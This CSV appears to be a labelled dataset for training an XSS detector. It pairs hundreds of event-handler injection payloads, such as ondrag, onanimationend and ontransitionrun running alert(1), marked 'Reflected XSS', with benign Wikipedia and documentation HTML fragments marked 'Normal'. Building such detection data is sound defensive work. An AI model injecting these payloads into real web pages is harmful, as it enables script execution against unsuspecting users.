Sentence,Final_Label
"<spacer onpaste=""alert(1)"" contenteditable>test</spacer>",Reflected XSS
"<track draggable=""true"" ondragstart=""alert(1)"">test</track>",Reflected XSS
<tbody onpointerleave=alert(1)>XSS</tbody>,Reflected XSS
<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>,Reflected XSS
<isindex onpointerout=alert(1)>XSS</isindex>,Reflected XSS
<nav id=x tabindex=1 ondeactivate=alert(1)></nav><input id=y autofocus>,Reflected XSS
<main id=x tabindex=1 onfocusin=alert(1)></main>,Reflected XSS
"<command onkeyup=""alert(1)"" contenteditable>test</command>",Reflected XSS
<del id=x tabindex=1 onactivate=alert(1)></del>,Reflected XSS
"<video onmouseover=""alert(1)"">test</video>",Reflected XSS
"<style>@keyframes slidein {}</style><command style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></command>",Reflected XSS
<textarea onbeforepaste=alert(1) autofocus></textarea>,Reflected XSS
"<command onbeforepaste=""alert(1)"" contenteditable>test</command>",Reflected XSS
"<li><a href=""/wiki/Scientific_theory"" title=""Scientific theory"">Scientific theory </a> </li>",Normal
<input onpointerover=alert(1)>XSS</input>,Reflected XSS
"<style>@keyframes x{}</style><noembed style=""animation-name:x"" onanimationend=""alert(1)""></noembed>",Reflected XSS
"<a href=""/wiki/Alternating_decision_tree"" title=""Alternating decision tree"">Decision tree </a>:",Normal
"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",Reflected XSS
"<th onclick=""alert(1)"">test</th>",Reflected XSS
"<summary onkeyup=""alert(1)"" contenteditable>test</summary>",Reflected XSS
"<li id=""cite_note-Nature2017-258""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Nature2017_258-0"">^ </a> </b> ",Normal
"<ul><li><a href=""/w/index.php?title=Grey_Wolf_Optimizer&amp;action=edit&amp;redlink=1"" class=""new"" title=""Grey Wolf Optimizer (page does not exist)"">Grey Wolf Optimizer </a> </li>",Normal
"<tr onmouseup=""alert(1)"">test</tr>",Reflected XSS
<video id=x tabindex=1 onactivate=alert(1)></video>,Reflected XSS
<input onpointermove=alert(1)>XSS</input>,Reflected XSS
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",Reflected XSS
<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>,Reflected XSS
<spacer onpointermove=alert(1)>XSS</spacer>,Reflected XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=57"" title=""Edit section: Artificial moral agents"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<style>@keyframes x{}</style><del style=""animation-name:x"" onanimationstart=""alert(1)""></del>",Reflected XSS
"<h2><span class=""mw-headline"" id=""Applications"">Applications<span id=""Goals""> ",Normal
<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>,Reflected XSS
"<image draggable=""true"" ondrag=""alert(1)"">test</image>",Reflected XSS
<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>,Reflected XSS
"<style>@keyframes x{}</style><mark style=""animation-name:x"" onanimationstart=""alert(1)""></mark>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lombardo P, Boehm I, Nairz K (2020). ""RadioComics – Santa Claus and the future of radiology"". <i>Eur J Radiol </i>. <b>122 </b> (1): 108771. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.ejrad.2019.108771"">10.1016/j.ejrad.2019.108771 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/31835078"">31835078 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Eur+J+Radiol&amp;rft.atitle=RadioComics+%E2%80%93+Santa+Claus+and+the+future+of+radiology&amp;rft.volume=122&amp;rft.issue=1&amp;rft.pages=108771&amp;rft.date=2020&amp;rft_id=info%3Adoi%2F10.1016%2Fj.ejrad.2019.108771&amp;rft_id=info%3Apmid%2F31835078&amp;rft.aulast=Lombardo&amp;rft.aufirst=P&amp;rft.au=Boehm%2C+I&amp;rft.au=Nairz%2C+K&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<summary oncut=""alert(1)"" contenteditable>test</summary>",Reflected XSS
"<label onmousemove=""alert(1)"">test</label>",Reflected XSS
"<content draggable=""true"" ondragstart=""alert(1)"">test</content>",Reflected XSS
<head id=x tabindex=1 onbeforeactivate=alert(1)></head>,Reflected XSS
"<base oncopy=""alert(1)"" contenteditable>test</base>",Reflected XSS
<col id=x tabindex=1 onfocus=alert(1)></col>,Reflected XSS
	 </span></a></dt><dd>Test your extraction code in an interactive environment.</dd>,Normal
<header onpointerleave=alert(1)>XSS</header>,Reflected XSS
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/email.html"">Sending e-mail</a></li>",Normal
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Academic_journal"" title=""Academic journal"">Journals </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
<set onpointerover=alert(1)>XSS</set>,Reflected XSS
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationend=""alert(1)""></element>",Reflected XSS
"<cite onmouseover=""alert(1)"">test</cite>",Reflected XSS
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",Reflected XSS
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Robotics"" title=""Template:Robotics""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Robotics"" title=""Template talk:Robotics""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Robotics&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",Normal
"<small onmouseup=""alert(1)"">test</small>",Reflected XSS
<xmp onpointerup=alert(1)>XSS</xmp>,Reflected XSS
"<em oncut=""alert(1)"" contenteditable>test</em>",Reflected XSS
"<shadow draggable=""true"" ondrag=""alert(1)"">test</shadow>",Reflected XSS
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>,Reflected XSS
<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>,Reflected XSS
"<li><a href=""/wiki/Very_Large_Scale_Integration"" title=""Very Large Scale Integration"">Very Large Scale Integration </a> </li>",Normal
"<style>:target {color: red;}</style><main id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></main>",Reflected XSS
<dl onpointermove=alert(1)>XSS</dl>,Reflected XSS
<code onblur=alert(1) tabindex=1 id=x></code><input autofocus>,Reflected XSS
"	 <div class=""thumbinner"" style=""width:222px;""><a href=""/wiki/File:Overfitted_Data.png"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/6/68/Overfitted_Data.png/220px-Overfitted_Data.png"" decoding=""async"" width=""220"" height=""149"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/6/68/Overfitted_Data.png/330px-Overfitted_Data.png 1.5x, //upload.wikimedia.org/wikipedia/commons/6/68/Overfitted_Data.png 2x"" data-file-width=""377"" data-file-height=""256"" /> </a>  <div class=""thumbcaption"">",Normal
"<th onmousedown=""alert(1)"">test</th>",Reflected XSS
<legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>,Reflected XSS
<var onpointermove=alert(1)>XSS</var>,Reflected XSS
"<nobr onpaste=""alert(1)"" contenteditable>test</nobr>",Reflected XSS
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Computer_science"" title=""Template:Computer science""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Computer_science"" title=""Template talk:Computer science""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Computer_science&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",Normal
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",Reflected XSS
"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",Reflected XSS
"<p draggable=""true"" ondragstart=""alert(1)"">test</p>",Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><track id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></track>",Reflected XSS
"<body onmousemove=""alert(1)"">test</body>",Reflected XSS
"<caption oncut=""alert(1)"" contenteditable>test</caption>",Reflected XSS
"<nextid draggable=""true"" ondragend=""alert(1)"">test</nextid>",Reflected XSS
<marquee onpointerdown=alert(1)>XSS</marquee>,Reflected XSS
"<plaintext onclick=""alert(1)"">test</plaintext>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation web"">Busby, Mattha (30 April 2018). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/technology/2018/apr/30/bookies-using-ai-to-keep-gamblers-hooked-insiders-say"">""Revealed: how bookies use AI to keep gamblers hooked"" </a>. <i>the Guardian </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=the+Guardian&amp;rft.atitle=Revealed%3A+how+bookies+use+AI+to+keep+gamblers+hooked&amp;rft.date=2018-04-30&amp;rft.aulast=Busby&amp;rft.aufirst=Mattha&amp;rft_id=https%3A%2F%2Fwww.theguardian.com%2Ftechnology%2F2018%2Fapr%2F30%2Fbookies-using-ai-to-keep-gamblers-hooked-insiders-say&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" ontransitionend=alert(1)></head>",Reflected XSS
<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>,Reflected XSS
<mark id=x tabindex=1 onactivate=alert(1)></mark>,Reflected XSS
  </ul>,Normal
"          <p class=""caption""><span class=""caption-text"">First steps",Normal
"<li><a href=""/wiki/World_Wide_Web"" title=""World Wide Web"">World Wide Web </a> </li>",Normal
"<style>@keyframes slidein {}</style><nextid style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nextid>",Reflected XSS
"<pre onpaste=""alert(1)"" contenteditable>test</pre>",Reflected XSS
<textarea onfocusout=alert(1) id=x></textarea><input autofocus>,Reflected XSS
"	<span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",Normal
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>",Reflected XSS
"<wbr oncontextmenu=""alert(1)"">test</wbr>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>",Reflected XSS
"          <dd><a href=""/en/0.24/"">0.24</a></dd>",Normal
"<source onmouseleave=""alert(1)"">test</source>",Reflected XSS
"<style>@keyframes slidein {}</style><i style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></i>",Reflected XSS
"<element onmouseup=""alert(1)"">test</element>",Reflected XSS
<acronym onpointerout=alert(1)>XSS</acronym>,Reflected XSS
"<li><a href=""/wiki/General_Problem_Solver"" title=""General Problem Solver"">General Problem Solver </a><span class=""nowrap"">&#160; ",Normal
"	 </span> <span class=""reference-text""><cite class=""citation news"">Rawlinson, Kevin (29 January 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.bbc.co.uk/news/31047780"">""Microsoft's Bill Gates insists AI is a threat"" </a>. <i>BBC News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20150129183607/http://www.bbc.co.uk/news/31047780"">Archived </a> from the original on 29 January 2015<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 January ",Normal
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=What+can+machine+learning+do%3F+Workforce+implications&amp;rft.pages=1530-1534&amp;rft.date=2017-12-22&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.aap8062&amp;rft_id=info%3Abibcode%2F2017Sci...358.1530B&amp;rft.aulast=Brynjolfsson&amp;rft.aufirst=Erik&amp;rft.au=Mitchell%2C+Tom&amp;rft_id=http%3A%2F%2Fscience.sciencemag.org%2Fcontent%2F358%2F6370%2F1530&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",Reflected XSS
<time id=x tabindex=1 onbeforeactivate=alert(1)></time>,Reflected XSS
"<kbd draggable=""true"" ondrag=""alert(1)"">test</kbd>",Reflected XSS
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,Reflected XSS
"<hr onkeyup=""alert(1)"" contenteditable>test</hr>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.scientificamerican.com/article/what-is-fuzzy-logic-are-t/"">""What is 'fuzzy logic'? Are there computers that are inherently fuzzy and do not apply the usual binary logic?"" </a>. <i>Scientific American </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">5 May ",Normal
</th> ,Normal
"<li id=""cite_note-Robotics-128""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Robotics_128-0"">^ </a> </b> ",Normal
"<colgroup onmousemove=""alert(1)"">test</colgroup>",Reflected XSS
"<li onmousedown=""alert(1)"">test</li>",Reflected XSS
"<base onmouseout=""alert(1)"">test</base>",Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><link id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></link>",Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>",Reflected XSS
"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationend=""alert(1)""></b>",Reflected XSS
<del onpointerover=alert(1)>XSS</del>,Reflected XSS
"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=alert(1)></image>",Reflected XSS
<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>,Reflected XSS
<keygen onpointerover=alert(1)>XSS</keygen>,Reflected XSS
"<big onpaste=""alert(1)"" contenteditable>test</big>",Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><element id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></element>",Reflected XSS
"<listing onpaste=""alert(1)"" contenteditable>test</listing>",Reflected XSS
"		<li id=""ca-nstab-main"" class=""selected""><a href=""/wiki/Artificial_intelligence"" title=""View the content page [c]"" accesskey=""c"">Article </a> </li><li id=""ca-talk""><a href=""/wiki/Talk:Artificial_intelligence"" rel=""discussion"" title=""Discussion about the content page [t]"" accesskey=""t"">Talk </a> </li>",Normal
"<ul><li><a href=""/wiki/3D_optical_data_storage"" title=""3D optical data storage"">3D optical data storage </a> </li>",Normal
"<i onbeforecopy=""alert(1)"" contenteditable>test</i>",Reflected XSS
"<form draggable=""true"" ondragleave=""alert(1)"">test</form>",Reflected XSS
"<li id=""cite_note-154""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-154"">^ </a> </b> ",Normal
"<li id=""cite_note-302""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-302"">^ </a> </b> ",Normal
"<h1 onbeforecut=""alert(1)"" contenteditable>test</h1>",Reflected XSS
"<li><a href=""/wiki/Huw_Price"" title=""Huw Price"">Huw Price </a> </li>",Normal
<input3 onpointerdown=alert(1)>XSS</input3>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><track ondragover=alert(1) contenteditable>drop here</track>",Reflected XSS
"<strong onkeyup=""alert(1)"" contenteditable>test</strong>",Reflected XSS
"<p draggable=""true"" ondrag=""alert(1)"">test</p>",Reflected XSS
"<menu onmouseup=""alert(1)"">test</menu>",Reflected XSS
"<s draggable=""true"" ondragstart=""alert(1)"">test</s>",Reflected XSS
"<p>Artificial intelligence in government consists of applications and regulation. Artificial intelligence paired with <a href=""/wiki/Facial_recognition_system"" title=""Facial recognition system"">facial recognition systems </a> may be used for mass surveillance. This is already the case in some parts of China.<sup id=""cite_ref-325"" class=""reference""><a href=""#cite_note-325"">&#91;314&#93; </a> </sup><sup id=""cite_ref-326"" class=""reference""><a href=""#cite_note-326"">&#91;315&#93; </a> </sup> An artificial intelligence has also competed in the Tama City <a href=""/wiki/AI_mayor"" class=""mw-redirect"" title=""AI mayor"">mayoral elections </a> in 2018.",Normal
"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>",Reflected XSS
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;333–381, </li>",Normal
"<li id=""cite_note-148""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-148"">^ </a> </b> ",Normal
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>",Reflected XSS
<keygen autofocus onfocus=alert(1)>,Reflected XSS
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></wbr>",Reflected XSS
<acronym id=x tabindex=1 onactivate=alert(1)></acronym>,Reflected XSS
"<br onbeforecut=""alert(1)"" contenteditable>test</br>",Reflected XSS
"<style>@keyframes slidein {}</style><table style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></table>",Reflected XSS
<progress id=x tabindex=1 onfocus=alert(1)></progress>,Reflected XSS
<col onpointerover=alert(1)>XSS</col>,Reflected XSS
"<marquee ondblclick=""alert(1)"">test</marquee>",Reflected XSS
"<data onmouseout=""alert(1)"">test</data>",Reflected XSS
"<li id=""cite_note-FOOTNOTEO&#39;BrienMarakas2011-286""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEO&#39;BrienMarakas2011_286-0"">^ </a> </b> ",Normal
"<menuitem onmouseenter=""alert(1)"">test</menuitem>",Reflected XSS
"<style>@keyframes x{}</style><head style=""animation-name:x"" onanimationend=""alert(1)""></head>",Reflected XSS
"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>",Reflected XSS
<slot onpointerdown=alert(1)>XSS</slot>,Reflected XSS
"<h3><span class=""mw-headline"" id=""Automotive"">Automotive ",Normal
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=41"" title=""Edit section: Law-related professions"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
<strong onpointerover=alert(1)>XSS</strong>,Reflected XSS
"<style>:target {color:red;}</style><bgsound id=x style=""transition:color 1s"" ontransitionend=alert(1)></bgsound>",Reflected XSS
<cite onpointerover=alert(1)>XSS</cite>,Reflected XSS
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,Reflected XSS
<base onpointerleave=alert(1)>XSS</base>,Reflected XSS
<div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>,Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/Charles_T._Rubin"" title=""Charles T. Rubin"">Rubin, Charles </a> (Spring 2003). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20120611115223/http://www.thenewatlantis.com/publications/artificial-intelligence-and-human-nature"">""Artificial Intelligence and Human Nature"" </a>. <i>The New Atlantis </i>. <b>1 </b>: 88–100. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.thenewatlantis.com/publications/artificial-intelligence-and-human-nature"">the original </a> on 11 June 2012. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+Atlantis&amp;rft.atitle=Artificial+Intelligence+and+Human+Nature&amp;rft.ssn=spring&amp;rft.volume=1&amp;rft.pages=88-100&amp;rft.date=2003&amp;rft.aulast=Rubin&amp;rft.aufirst=Charles&amp;rft_id=http%3A%2F%2Fwww.thenewatlantis.com%2Fpublications%2Fartificial-intelligence-and-human-nature&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>,Reflected XSS
<image3 onpointerleave=alert(1)>XSS</image3>,Reflected XSS
"<li><a href=""/wiki/Future_of_Humanity_Institute"" title=""Future of Humanity Institute"">Future of Humanity Institute </a> </li>",Normal
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;pp. 132–147, </li>",Normal
"<ul><li><a href=""/wiki/Algorithm_design"" class=""mw-redirect"" title=""Algorithm design"">Algorithm design </a> </li>",Normal
<var onpointerover=alert(1)>XSS</var>,Reflected XSS
<base id=x tabindex=1 onactivate=alert(1)></base>,Reflected XSS
"<map onkeydown=""alert(1)"" contenteditable>test</map>",Reflected XSS
<input type=image src=1 onerror=alert(1)>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>",Reflected XSS
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;449–455 </li> </ul>",Normal
<animatemotion onpointerup=alert(1)>XSS</animatemotion>,Reflected XSS
"<time oncopy=""alert(1)"" contenteditable>test</time>",Reflected XSS
"<label draggable=""true"" ondragend=""alert(1)"">test</label>",Reflected XSS
Breadth of commonsense knowledge:,Normal
"<li><a href=""/wiki/Existential_risk_from_artificial_general_intelligence"" title=""Existential risk from artificial general intelligence"">Existential risk </a> </li>",Normal
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,Reflected XSS
"<a href=""/wiki/Dreyfus%27_critique_of_artificial_intelligence"" class=""mw-redirect"" title=""Dreyfus&#39; critique of artificial intelligence"">Dreyfus' critique of artificial intelligence </a>:",Normal
"<a ondblclick=""alert(1)"">test</a>",Reflected XSS
<rb id=x tabindex=1 ondeactivate=alert(1)></rb><input id=y autofocus>,Reflected XSS
"<ul><li><img alt=""Category"" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png"" decoding=""async"" title=""Category"" width=""16"" height=""14"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/24px-Folder_Hexagonal_Icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/32px-Folder_Hexagonal_Icon.svg.png 2x"" data-file-width=""36"" data-file-height=""31"" /> <b><a href=""/wiki/Category:Emerging_technologies"" title=""Category:Emerging technologies"">Category </a> </b> </li>",Normal
"<td onkeyup=""alert(1)"" contenteditable>test</td>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.siemens.com/innovation/en/home/pictures-of-the-future/digitalization-and-software/autonomous-systems-infographic.html"">""Autonomous Systems: Infographic"" </a>. <i>siemens.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 February ",Normal
"<li><a href=""/wiki/Empirical_evidence"" title=""Empirical evidence"">Empirical evidence </a> </li>",Normal
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meter id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></meter>",Reflected XSS
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Search_algorithm"" title=""Search algorithm"">Search algorithm </a>, <a href=""/wiki/Mathematical_optimization"" title=""Mathematical optimization"">Mathematical optimization </a>, and <a href=""/wiki/Evolutionary_computation"" title=""Evolutionary computation"">Evolutionary computation </a> </div>",Normal
"<sub ondblclick=""alert(1)"">test</sub>",Reflected XSS
"	 </span> <span class=""toctext"">Approaches ",Normal
"<li><a href=""/wiki/Soft_robotics"" title=""Soft robotics"">Soft robotics </a> </li> </ul>",Normal
"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>",Reflected XSS
"<area onkeyup=""alert(1)"" contenteditable>test</area>",Reflected XSS
"<tr draggable=""true"" ondragend=""alert(1)"">test</tr>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>",Reflected XSS
"<data oncopy=""alert(1)"" contenteditable>test</data>",Reflected XSS
"<video onmousemove=""alert(1)"">test</video>",Reflected XSS
"<form oncopy=""alert(1)"" contenteditable>test</form>",Reflected XSS
<menu onpointerenter=alert(1)>XSS</menu>,Reflected XSS
"<style>:target {color:red;}</style><dt id=x style=""transition:color 1s"" ontransitionend=alert(1)></dt>",Reflected XSS
"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>",Reflected XSS
<nav id=x tabindex=1 onfocusin=alert(1)></nav>,Reflected XSS
"<header oncut=""alert(1)"" contenteditable>test</header>",Reflected XSS
"	 </span> <span class=""reference-text"">See the <a href=""/wiki/Dartmouth_Workshop"" class=""mw-redirect"" title=""Dartmouth Workshop"">Dartmouth proposal </a>, under <a href=""#Philosophy"">Philosophy </a>, below. ",Normal
"<col draggable=""true"" ondragstart=""alert(1)"">test</col>",Reflected XSS
"<button onclick=""alert(1)"">test</button>",Reflected XSS
"<li id=""cite_note-FOOTNOTEGladwell2005-108""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEGladwell2005_108-0"">^ </a> </b> ",Normal
"<dd draggable=""true"" ondragend=""alert(1)"">test</dd>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></form>",Reflected XSS
"<style>:target {color: red;}</style><wbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></wbr>",Reflected XSS
"<image onmouseenter=""alert(1)"">test</image>",Reflected XSS
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationend=""alert(1)""></xmp>",Reflected XSS
